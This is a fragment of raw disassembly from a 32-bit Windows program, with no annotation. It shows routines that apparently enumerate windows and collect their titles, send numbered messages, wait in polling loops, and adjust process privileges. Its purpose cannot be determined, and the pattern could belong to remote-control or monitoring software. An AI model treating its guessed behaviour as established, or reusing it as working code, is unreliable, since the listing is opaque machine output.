  40883f:	6a 30                	push   $0x30
  408841:	50                   	push   %eax
  408842:	e8 92 c3 ff ff       	call   0x404bd9
  408847:	83 c4 0c             	add    $0xc,%esp
  40884a:	8d 8d 20 fe ff ff    	lea    -0x1e0(%ebp),%ecx
  408850:	ff 15 9c d2 40 00    	call   *0x40d29c
  408856:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  408859:	ff 15 98 d2 40 00    	call   *0x40d298
  40885f:	50                   	push   %eax
  408860:	6a 02                	push   $0x2
  408862:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408865:	e8 f5 92 ff ff       	call   0x401b5f
  40886a:	83 ec 10             	sub    $0x10,%esp
  40886d:	8b cc                	mov    %esp,%ecx
  40886f:	50                   	push   %eax
  408870:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  408876:	e8 bb 2f 00 00       	call   0x40b836
  40887b:	83 c4 14             	add    $0x14,%esp
  40887e:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  408881:	ff 15 98 d2 40 00    	call   *0x40d298
  408887:	50                   	push   %eax
  408888:	56                   	push   %esi
  408889:	e8 1c 33 00 00       	call   0x40bbaa
  40888e:	59                   	pop    %ecx
  40888f:	59                   	pop    %ecx
  408890:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  408893:	e9 b4 fd ff ff       	jmp    0x40864c
  408898:	6a 00                	push   $0x0
  40889a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40889d:	e8 bd 92 ff ff       	call   0x401b5f
  4088a2:	8b c8                	mov    %eax,%ecx
  4088a4:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4088aa:	50                   	push   %eax
  4088ab:	ff 15 58 d3 40 00    	call   *0x40d358
  4088b1:	50                   	push   %eax
  4088b2:	e8 4b b3 ff ff       	call   0x403c02
  4088b7:	59                   	pop    %ecx
  4088b8:	59                   	pop    %ecx
  4088b9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4088bc:	e8 6f 92 ff ff       	call   0x401b30
  4088c1:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4088c4:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4088ca:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4088cd:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4088d3:	5f                   	pop    %edi
  4088d4:	5e                   	pop    %esi
  4088d5:	33 c0                	xor    %eax,%eax
  4088d7:	5b                   	pop    %ebx
  4088d8:	c9                   	leave
  4088d9:	c2 04 00             	ret    $0x4
  4088dc:	f1                   	int1
  4088dd:	7a 40                	jp     0x40891f
  4088df:	00 7e 7c             	add    %bh,0x7c(%esi)
  4088e2:	40                   	inc    %eax
  4088e3:	00 20                	add    %ah,(%eax)
  4088e5:	86 40 00             	xchg   %al,0x0(%eax)
  4088e8:	8f                   	(bad)
  4088e9:	7c 40                	jl     0x40892b
  4088eb:	00 61 7d             	add    %ah,0x7d(%ecx)
  4088ee:	40                   	inc    %eax
  4088ef:	00 1b                	add    %bl,(%ebx)
  4088f1:	7e 40                	jle    0x408933
  4088f3:	00 7a 7e             	add    %bh,0x7e(%edx)
  4088f6:	40                   	inc    %eax
  4088f7:	00 f5                	add    %dh,%ch
  4088f9:	87 40 00             	xchg   %eax,0x0(%eax)
  4088fc:	9e                   	sahf
  4088fd:	7e 40                	jle    0x40893f
  4088ff:	00 c4                	add    %al,%ah
  408901:	7e 40                	jle    0x408943
  408903:	00 c8                	add    %cl,%al
  408905:	7e 40                	jle    0x408947
  408907:	00 f0                	add    %dh,%al
  408909:	7e 40                	jle    0x40894b
  40890b:	00 23                	add    %ah,(%ebx)
  40890d:	7f 40                	jg     0x40894f
  40890f:	00 57 7f             	add    %dl,0x7f(%edi)
  408912:	40                   	inc    %eax
  408913:	00 9a 7f 40 00 d8    	add    %bl,-0x27ffbf81(%edx)
  408919:	7f 40                	jg     0x40895b
  40891b:	00 4a 80             	add    %cl,-0x80(%edx)
  40891e:	40                   	inc    %eax
  40891f:	00 b9 88 40 00 b9    	add    %bh,-0x46ffbf78(%ecx)
  408925:	88 40 00             	mov    %al,0x0(%eax)
  408928:	b9 88 40 00 b9       	mov    $0xb9004088,%ecx
  40892d:	88 40 00             	mov    %al,0x0(%eax)
  408930:	b9 88 40 00 b9       	mov    $0xb9004088,%ecx
  408935:	88 40 00             	mov    %al,0x0(%eax)
  408938:	b9 88 40 00 b9       	mov    $0xb9004088,%ecx
  40893d:	88 40 00             	mov    %al,0x0(%eax)
  408940:	b9 88 40 00 b9       	mov    $0xb9004088,%ecx
  408945:	88 40 00             	mov    %al,0x0(%eax)
  408948:	b9 88 40 00 b9       	mov    $0xb9004088,%ecx
  40894d:	88 40 00             	mov    %al,0x0(%eax)
  408950:	b9 88 40 00 b9       	mov    $0xb9004088,%ecx
  408955:	88 40 00             	mov    %al,0x0(%eax)
  408958:	60                   	pusha
  408959:	80 40 00 93          	addb   $0x93,0x0(%eax)
  40895d:	80 40 00 9b          	addb   $0x9b,0x0(%eax)
  408961:	80 40 00 b9          	addb   $0xb9,0x0(%eax)
  408965:	80 40 00 c3          	addb   $0xc3,0x0(%eax)
  408969:	80 40 00 92          	addb   $0x92,0x0(%eax)
  40896d:	81 40 00 3f 82 40 00 	addl   $0x40823f,0x0(%eax)
  408974:	c2 82 40             	ret    $0x4082
  408977:	00 76 84             	add    %dh,-0x7c(%esi)
  40897a:	40                   	inc    %eax
  40897b:	00 d4                	add    %dl,%ah
  40897d:	83 40 00 5b          	addl   $0x5b,0x0(%eax)
  408981:	84 40 00             	test   %al,0x0(%eax)
  408984:	cf                   	iret
  408985:	84 40 00             	test   %al,0x0(%eax)
  408988:	ec                   	in     (%dx),%al
  408989:	84 40 00             	test   %al,0x0(%eax)
  40898c:	33 85 40 00 3d 85    	xor    -0x7ac2ffc0(%ebp),%eax
  408992:	40                   	inc    %eax
  408993:	00 5d 85             	add    %bl,-0x7b(%ebp)
  408996:	40                   	inc    %eax
  408997:	00 7d 85             	add    %bh,-0x7b(%ebp)
  40899a:	40                   	inc    %eax
  40899b:	00 9d 85 40 00 00    	add    %bl,0x4085(%ebp)
  4089a1:	86 40 00             	xchg   %al,0x0(%eax)
  4089a4:	b9 88 40 00 57       	mov    $0x57004088,%ecx
  4089a9:	86 40 00             	xchg   %al,0x0(%eax)
  4089ac:	55                   	push   %ebp
  4089ad:	8b ec                	mov    %esp,%ebp
  4089af:	81 ec 98 00 00 00    	sub    $0x98,%esp
  4089b5:	80 3d b5 1b 41 00 01 	cmpb   $0x1,0x411bb5
  4089bc:	56                   	push   %esi
  4089bd:	57                   	push   %edi
  4089be:	0f 84 0b 01 00 00    	je     0x408acf
  4089c4:	6a 01                	push   $0x1
  4089c6:	8d 8d 68 ff ff ff    	lea    -0x98(%ebp),%ecx
  4089cc:	c6 05 b5 1b 41 00 01 	movb   $0x1,0x411bb5
  4089d3:	e8 a0 86 ff ff       	call   0x401078
  4089d8:	83 ec 10             	sub    $0x10,%esp
  4089db:	be 78 11 41 00       	mov    $0x411178,%esi
  4089e0:	8b fc                	mov    %esp,%edi
  4089e2:	8d 8d 68 ff ff ff    	lea    -0x98(%ebp),%ecx
  4089e8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4089e9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4089ea:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4089eb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4089ec:	e8 12 87 ff ff       	call   0x401103
  4089f1:	83 ec 10             	sub    $0x10,%esp
  4089f4:	8d 45 08             	lea    0x8(%ebp),%eax
  4089f7:	8b cc                	mov    %esp,%ecx
  4089f9:	50                   	push   %eax
  4089fa:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  408a00:	68 95 00 00 00       	push   $0x95
  408a05:	8d 8d 68 ff ff ff    	lea    -0x98(%ebp),%ecx
  408a0b:	e8 1a 87 ff ff       	call   0x40112a
  408a10:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408a13:	50                   	push   %eax
  408a14:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408a17:	50                   	push   %eax
  408a18:	e8 80 23 00 00       	call   0x40ad9d
  408a1d:	59                   	pop    %ecx
  408a1e:	59                   	pop    %ecx
  408a1f:	e8 f4 23 00 00       	call   0x40ae18
  408a24:	88 45 ff             	mov    %al,-0x1(%ebp)
  408a27:	8d 45 fe             	lea    -0x2(%ebp),%eax
  408a2a:	50                   	push   %eax
  408a2b:	8d 45 ff             	lea    -0x1(%ebp),%eax
  408a2e:	6a 01                	push   $0x1
  408a30:	50                   	push   %eax
  408a31:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  408a34:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  408a3a:	83 ec 10             	sub    $0x10,%esp
  408a3d:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  408a40:	8b f4                	mov    %esp,%esi
  408a42:	50                   	push   %eax
  408a43:	8d 45 fd             	lea    -0x3(%ebp),%eax
  408a46:	50                   	push   %eax
  408a47:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408a4a:	6a 08                	push   $0x8
  408a4c:	50                   	push   %eax
  408a4d:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  408a53:	50                   	push   %eax
  408a54:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408a57:	50                   	push   %eax
  408a58:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408a5b:	6a 08                	push   $0x8
  408a5d:	50                   	push   %eax
  408a5e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  408a61:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  408a67:	50                   	push   %eax
  408a68:	8d 45 ac             	lea    -0x54(%ebp),%eax
  408a6b:	50                   	push   %eax
  408a6c:	e8 47 3c 00 00       	call   0x40c6b8
  408a71:	83 c4 0c             	add    $0xc,%esp
  408a74:	50                   	push   %eax
  408a75:	56                   	push   %esi
  408a76:	e8 3d 3c 00 00       	call   0x40c6b8
  408a7b:	83 c4 0c             	add    $0xc,%esp
  408a7e:	8d 8d 68 ff ff ff    	lea    -0x98(%ebp),%ecx
  408a84:	68 96 00 00 00       	push   $0x96
  408a89:	e8 9c 86 ff ff       	call   0x40112a
  408a8e:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  408a91:	8b f0                	mov    %eax,%esi
  408a93:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408a99:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  408a9c:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408aa2:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  408aa5:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408aab:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  408aae:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408ab4:	83 fe ff             	cmp    $0xffffffff,%esi
  408ab7:	0f 85 53 ff ff ff    	jne    0x408a10
  408abd:	80 25 b5 1b 41 00 00 	andb   $0x0,0x411bb5
  408ac4:	8d 8d 68 ff ff ff    	lea    -0x98(%ebp),%ecx
  408aca:	e8 9c 86 ff ff       	call   0x40116b
  408acf:	8d 4d 08             	lea    0x8(%ebp),%ecx
  408ad2:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408ad8:	5f                   	pop    %edi
  408ad9:	5e                   	pop    %esi
  408ada:	c9                   	leave
  408adb:	c3                   	ret
  408adc:	55                   	push   %ebp
  408add:	8b ec                	mov    %esp,%ebp
  408adf:	83 ec 78             	sub    $0x78,%esp
  408ae2:	53                   	push   %ebx
  408ae3:	56                   	push   %esi
  408ae4:	57                   	push   %edi
  408ae5:	8d 45 ff             	lea    -0x1(%ebp),%eax
  408ae8:	68 9c dd 40 00       	push   $0x40dd9c
  408aed:	50                   	push   %eax
  408aee:	68 90 dd 40 00       	push   $0x40dd90
  408af3:	ff 15 44 d3 40 00    	call   *0x40d344
  408af9:	59                   	pop    %ecx
  408afa:	50                   	push   %eax
  408afb:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  408afe:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  408b04:	50                   	push   %eax
  408b05:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408b08:	50                   	push   %eax
  408b09:	e8 bc 3b 00 00       	call   0x40c6ca
  408b0e:	83 c4 0c             	add    $0xc,%esp
  408b11:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  408b14:	ff 15 9c d2 40 00    	call   *0x40d29c
  408b1a:	33 db                	xor    %ebx,%ebx
  408b1c:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408b1f:	53                   	push   %ebx
  408b20:	53                   	push   %ebx
  408b21:	50                   	push   %eax
  408b22:	8d 45 cc             	lea    -0x34(%ebp),%eax
  408b25:	68 88 dd 40 00       	push   $0x40dd88
  408b2a:	50                   	push   %eax
  408b2b:	e8 ac 3b 00 00       	call   0x40c6dc
  408b30:	83 c4 0c             	add    $0xc,%esp
  408b33:	8b c8                	mov    %eax,%ecx
  408b35:	ff 15 98 d2 40 00    	call   *0x40d298
  408b3b:	50                   	push   %eax
  408b3c:	68 78 dd 40 00       	push   $0x40dd78
  408b41:	68 d0 d6 40 00       	push   $0x40d6d0
  408b46:	53                   	push   %ebx
  408b47:	ff 15 9c d3 40 00    	call   *0x40d39c
  408b4d:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  408b50:	ff 15 9c d2 40 00    	call   *0x40d29c
  408b56:	8d 45 ff             	lea    -0x1(%ebp),%eax
  408b59:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408b5c:	50                   	push   %eax
  408b5d:	ff 15 dc d2 40 00    	call   *0x40d2dc
  408b63:	33 f6                	xor    %esi,%esi
  408b65:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408b68:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  408b6b:	50                   	push   %eax
  408b6c:	ff 15 98 d2 40 00    	call   *0x40d298
  408b72:	50                   	push   %eax
  408b73:	e8 4f 2c 00 00       	call   0x40b7c7
  408b78:	59                   	pop    %ecx
  408b79:	59                   	pop    %ecx
  408b7a:	6a 64                	push   $0x64
  408b7c:	ff 15 94 d1 40 00    	call   *0x40d194
  408b82:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408b85:	46                   	inc    %esi
  408b86:	ff 15 b0 d2 40 00    	call   *0x40d2b0
  408b8c:	84 c0                	test   %al,%al
  408b8e:	74 08                	je     0x408b98
  408b90:	81 fe 58 02 00 00    	cmp    $0x258,%esi
  408b96:	7c cd                	jl     0x408b65
  408b98:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408b9b:	ff 15 b0 d2 40 00    	call   *0x40d2b0
  408ba1:	84 c0                	test   %al,%al
  408ba3:	0f 85 80 00 00 00    	jne    0x408c29
  408ba9:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  408bac:	ff 15 98 d2 40 00    	call   *0x40d298
  408bb2:	50                   	push   %eax
  408bb3:	ff 15 48 d1 40 00    	call   *0x40d148
  408bb9:	6a 01                	push   $0x1
  408bbb:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  408bbe:	5b                   	pop    %ebx
  408bbf:	53                   	push   %ebx
  408bc0:	e8 b3 84 ff ff       	call   0x401078
  408bc5:	83 ec 10             	sub    $0x10,%esp
  408bc8:	be 78 11 41 00       	mov    $0x411178,%esi
  408bcd:	8b fc                	mov    %esp,%edi
  408bcf:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  408bd2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408bd3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408bd4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408bd5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408bd6:	e8 28 85 ff ff       	call   0x401103
  408bdb:	83 ec 10             	sub    $0x10,%esp
  408bde:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408be1:	8b f4                	mov    %esp,%esi
  408be3:	50                   	push   %eax
  408be4:	8d 45 08             	lea    0x8(%ebp),%eax
  408be7:	68 68 11 41 00       	push   $0x411168
  408bec:	50                   	push   %eax
  408bed:	8d 45 cc             	lea    -0x34(%ebp),%eax
  408bf0:	50                   	push   %eax
  408bf1:	e8 c2 3a 00 00       	call   0x40c6b8
  408bf6:	83 c4 0c             	add    $0xc,%esp
  408bf9:	50                   	push   %eax
  408bfa:	56                   	push   %esi
  408bfb:	e8 b8 3a 00 00       	call   0x40c6b8
  408c00:	83 c4 0c             	add    $0xc,%esp
  408c03:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  408c06:	68 97 00 00 00       	push   $0x97
  408c0b:	e8 1a 85 ff ff       	call   0x40112a
  408c10:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  408c13:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408c19:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  408c1c:	e8 3b 85 ff ff       	call   0x40115c
  408c21:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  408c24:	e8 42 85 ff ff       	call   0x40116b
  408c29:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408c2c:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408c32:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  408c35:	ff 15 9c d2 40 00    	call   *0x40d29c
  408c3b:	8d 4d 08             	lea    0x8(%ebp),%ecx
  408c3e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408c44:	5f                   	pop    %edi
  408c45:	8a c3                	mov    %bl,%al
  408c47:	5e                   	pop    %esi
  408c48:	5b                   	pop    %ebx
  408c49:	c9                   	leave
  408c4a:	c3                   	ret
  408c4b:	55                   	push   %ebp
  408c4c:	8b ec                	mov    %esp,%ebp
  408c4e:	81 ec b4 02 00 00    	sub    $0x2b4,%esp
  408c54:	8d 85 4c fd ff ff    	lea    -0x2b4(%ebp),%eax
  408c5a:	68 2c 01 00 00       	push   $0x12c
  408c5f:	50                   	push   %eax
  408c60:	ff 75 08             	push   0x8(%ebp)
  408c63:	ff 15 14 d4 40 00    	call   *0x40d414
  408c69:	ff 75 08             	push   0x8(%ebp)
  408c6c:	ff 15 e0 d3 40 00    	call   *0x40d3e0
  408c72:	85 c0                	test   %eax,%eax
  408c74:	0f 84 b4 00 00 00    	je     0x408d2e
  408c7a:	66 83 bd 4c fd ff ff 	cmpw   $0x0,-0x2b4(%ebp)
  408c81:	00 
  408c82:	0f 84 a6 00 00 00    	je     0x408d2e
  408c88:	ff 75 08             	push   0x8(%ebp)
  408c8b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408c8e:	68 d0 dd 40 00       	push   $0x40ddd0
  408c93:	50                   	push   %eax
  408c94:	ff 15 38 d3 40 00    	call   *0x40d338
  408c9a:	83 c4 0c             	add    $0xc,%esp
  408c9d:	8d 45 0b             	lea    0xb(%ebp),%eax
  408ca0:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  408ca3:	50                   	push   %eax
  408ca4:	8d 85 4c fd ff ff    	lea    -0x2b4(%ebp),%eax
  408caa:	50                   	push   %eax
  408cab:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  408cb1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408cb4:	68 c4 dd 40 00       	push   $0x40ddc4
  408cb9:	50                   	push   %eax
  408cba:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  408cbd:	68 b8 dd 40 00       	push   $0x40ddb8
  408cc2:	50                   	push   %eax
  408cc3:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  408cc6:	50                   	push   %eax
  408cc7:	e8 02 26 00 00       	call   0x40b2ce
  408ccc:	59                   	pop    %ecx
  408ccd:	59                   	pop    %ecx
  408cce:	50                   	push   %eax
  408ccf:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  408cd2:	50                   	push   %eax
  408cd3:	e8 c8 39 00 00       	call   0x40c6a0
  408cd8:	83 c4 0c             	add    $0xc,%esp
  408cdb:	50                   	push   %eax
  408cdc:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  408cdf:	50                   	push   %eax
  408ce0:	e8 bb 39 00 00       	call   0x40c6a0
  408ce5:	83 c4 0c             	add    $0xc,%esp
  408ce8:	50                   	push   %eax
  408ce9:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  408cec:	50                   	push   %eax
  408ced:	e8 ae 39 00 00       	call   0x40c6a0
  408cf2:	83 c4 0c             	add    $0xc,%esp
  408cf5:	b9 60 1b 41 00       	mov    $0x411b60,%ecx
  408cfa:	50                   	push   %eax
  408cfb:	ff 15 e4 d2 40 00    	call   *0x40d2e4
  408d01:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  408d04:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408d0a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  408d0d:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408d13:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  408d16:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408d1c:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  408d1f:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  408d25:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  408d28:	ff 15 9c d2 40 00    	call   *0x40d29c
  408d2e:	6a 01                	push   $0x1
  408d30:	58                   	pop    %eax
  408d31:	c9                   	leave
  408d32:	c2 08 00             	ret    $0x8
  408d35:	6a 00                	push   $0x0
  408d37:	68 4b 8c 40 00       	push   $0x408c4b
  408d3c:	ff 15 d8 d3 40 00    	call   *0x40d3d8
  408d42:	83 ec 10             	sub    $0x10,%esp
  408d45:	8b cc                	mov    %esp,%ecx
  408d47:	68 60 1b 41 00       	push   $0x411b60
  408d4c:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  408d52:	6a 63                	push   $0x63
  408d54:	b9 70 1b 41 00       	mov    $0x411b70,%ecx
  408d59:	e8 cc 83 ff ff       	call   0x40112a
  408d5e:	68 a0 d4 40 00       	push   $0x40d4a0
  408d63:	b9 60 1b 41 00       	mov    $0x411b60,%ecx
  408d68:	ff 15 78 d2 40 00    	call   *0x40d278
  408d6e:	c3                   	ret
  408d6f:	55                   	push   %ebp
  408d70:	8b ec                	mov    %esp,%ebp
  408d72:	83 ec 14             	sub    $0x14,%esp
  408d75:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408d78:	56                   	push   %esi
  408d79:	50                   	push   %eax
  408d7a:	6a 28                	push   $0x28
  408d7c:	ff 15 d0 d0 40 00    	call   *0x40d0d0
  408d82:	50                   	push   %eax
  408d83:	ff 15 6c d0 40 00    	call   *0x40d06c
  408d89:	8d 45 f0             	lea    -0x10(%ebp),%eax
  408d8c:	33 f6                	xor    %esi,%esi
  408d8e:	50                   	push   %eax
  408d8f:	68 d4 dd 40 00       	push   $0x40ddd4
  408d94:	56                   	push   %esi
  408d95:	ff 15 68 d0 40 00    	call   *0x40d068
  408d9b:	56                   	push   %esi
  408d9c:	56                   	push   %esi
  408d9d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408da0:	56                   	push   %esi
  408da1:	50                   	push   %eax
  408da2:	56                   	push   %esi
  408da3:	ff 75 fc             	push   -0x4(%ebp)
  408da6:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  408dad:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
  408db4:	ff 15 64 d0 40 00    	call   *0x40d064
  408dba:	ff 15 14 d1 40 00    	call   *0x40d114
  408dc0:	f7 d8                	neg    %eax
  408dc2:	1b c0                	sbb    %eax,%eax
  408dc4:	5e                   	pop    %esi
  408dc5:	f7 d8                	neg    %eax
  408dc7:	c9                   	leave
  408dc8:	c3                   	ret
  408dc9:	55                   	push   %ebp
  408dca:	8b ec                	mov    %esp,%ebp
  408dcc:	56                   	push   %esi
  408dcd:	8b f1                	mov    %ecx,%esi
  408dcf:	ff 75 08             	push   0x8(%ebp)
  408dd2:	e8 c3 2f 00 00       	call   0x40bd9a
  408dd7:	50                   	push   %eax
  408dd8:	8b ce                	mov    %esi,%ecx
  408dda:	e8 05 00 00 00       	call   0x408de4
  408ddf:	5e                   	pop    %esi
  408de0:	5d                   	pop    %ebp
  408de1:	c2 04 00             	ret    $0x4
  408de4:	55                   	push   %ebp
  408de5:	8b ec                	mov    %esp,%ebp
  408de7:	56                   	push   %esi
  408de8:	57                   	push   %edi
  408de9:	8b f9                	mov    %ecx,%edi
  408deb:	e8 9b 8d ff ff       	call   0x401b8b
  408df0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408df3:	6a 0c                	push   $0xc
  408df5:	2b c8                	sub    %eax,%ecx
  408df7:	8b c1                	mov    %ecx,%eax
  408df9:	59                   	pop    %ecx
  408dfa:	99                   	cltd
  408dfb:	f7 f9                	idiv   %ecx
  408dfd:	ff 75 0c             	push   0xc(%ebp)
  408e00:	8b cf                	mov    %edi,%ecx
  408e02:	6a 01                	push   $0x1
  408e04:	ff 75 08             	push   0x8(%ebp)
  408e07:	8b f0                	mov    %eax,%esi
  408e09:	e8 13 00 00 00       	call   0x408e21
  408e0e:	8b cf                	mov    %edi,%ecx
  408e10:	e8 76 8d ff ff       	call   0x401b8b
  408e15:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  408e18:	5f                   	pop    %edi
  408e19:	5e                   	pop    %esi
  408e1a:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  408e1d:	5d                   	pop    %ebp
  408e1e:	c2 08 00             	ret    $0x8
  408e21:	55                   	push   %ebp
  408e22:	8b ec                	mov    %esp,%ebp
  408e24:	51                   	push   %ecx
  408e25:	53                   	push   %ebx
  408e26:	56                   	push   %esi
  408e27:	8b f1                	mov    %ecx,%esi
  408e29:	57                   	push   %edi
  408e2a:	6a 0c                	push   $0xc
  408e2c:	8b 4e 08             	mov    0x8(%esi),%ecx
  408e2f:	8b 46 0c             	mov    0xc(%esi),%eax
  408e32:	2b c1                	sub    %ecx,%eax
  408e34:	5f                   	pop    %edi
  408e35:	99                   	cltd
  408e36:	f7 ff                	idiv   %edi
  408e38:	8b 7d 0c             	mov    0xc(%ebp),%edi
  408e3b:	3b c7                	cmp    %edi,%eax
  408e3d:	0f 83 b3 00 00 00    	jae    0x408ef6
  408e43:	8b ce                	mov    %esi,%ecx
  408e45:	e8 9b ae ff ff       	call   0x403ce5
  408e4a:	3b f8                	cmp    %eax,%edi
  408e4c:	73 0c                	jae    0x408e5a
  408e4e:	8b ce                	mov    %esi,%ecx
  408e50:	e8 90 ae ff ff       	call   0x403ce5
  408e55:	89 45 0c             	mov    %eax,0xc(%ebp)
  408e58:	eb 03                	jmp    0x408e5d
  408e5a:	89 7d 0c             	mov    %edi,0xc(%ebp)
  408e5d:	8b ce                	mov    %esi,%ecx
  408e5f:	e8 81 ae ff ff       	call   0x403ce5
  408e64:	8b d8                	mov    %eax,%ebx
  408e66:	6a 00                	push   $0x0
  408e68:	03 5d 0c             	add    0xc(%ebp),%ebx
  408e6b:	8b ce                	mov    %esi,%ecx
  408e6d:	53                   	push   %ebx
  408e6e:	e8 6e 01 00 00       	call   0x408fe1
  408e73:	50                   	push   %eax
  408e74:	8b ce                	mov    %esi,%ecx
  408e76:	ff 75 08             	push   0x8(%ebp)
  408e79:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408e7c:	ff 76 04             	push   0x4(%esi)
  408e7f:	e8 09 01 00 00       	call   0x408f8d
  408e84:	ff 75 10             	push   0x10(%ebp)
  408e87:	8b ce                	mov    %esi,%ecx
  408e89:	89 45 0c             	mov    %eax,0xc(%ebp)
  408e8c:	57                   	push   %edi
  408e8d:	50                   	push   %eax
  408e8e:	e8 26 01 00 00       	call   0x408fb9
  408e93:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408e96:	8d 04 7f             	lea    (%edi,%edi,2),%eax
  408e99:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  408e9c:	8b ce                	mov    %esi,%ecx
  408e9e:	50                   	push   %eax
  408e9f:	ff 76 08             	push   0x8(%esi)
  408ea2:	ff 75 08             	push   0x8(%ebp)
  408ea5:	e8 e3 00 00 00       	call   0x408f8d
  408eaa:	ff 76 08             	push   0x8(%esi)
  408ead:	8b ce                	mov    %esi,%ecx
  408eaf:	ff 76 04             	push   0x4(%esi)
  408eb2:	e8 a9 ae ff ff       	call   0x403d60
  408eb7:	8b 4e 04             	mov    0x4(%esi),%ecx
  408eba:	8b 46 0c             	mov    0xc(%esi),%eax
  408ebd:	2b c1                	sub    %ecx,%eax
  408ebf:	6a 0c                	push   $0xc
  408ec1:	99                   	cltd
  408ec2:	59                   	pop    %ecx
  408ec3:	f7 f9                	idiv   %ecx
  408ec5:	8b ce                	mov    %esi,%ecx
  408ec7:	50                   	push   %eax
  408ec8:	ff 76 04             	push   0x4(%esi)
  408ecb:	e8 b2 ae ff ff       	call   0x403d82
  408ed0:	8d 04 5b             	lea    (%ebx,%ebx,2),%eax
  408ed3:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  408ed6:	8b ce                	mov    %esi,%ecx
  408ed8:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  408edb:	89 46 0c             	mov    %eax,0xc(%esi)
  408ede:	e8 02 ae ff ff       	call   0x403ce5
  408ee3:	03 c7                	add    %edi,%eax
  408ee5:	89 5e 04             	mov    %ebx,0x4(%esi)
  408ee8:	8d 04 40             	lea    (%eax,%eax,2),%eax
  408eeb:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  408eee:	89 46 08             	mov    %eax,0x8(%esi)
  408ef1:	e9 90 00 00 00       	jmp    0x408f86
  408ef6:	8b c1                	mov    %ecx,%eax
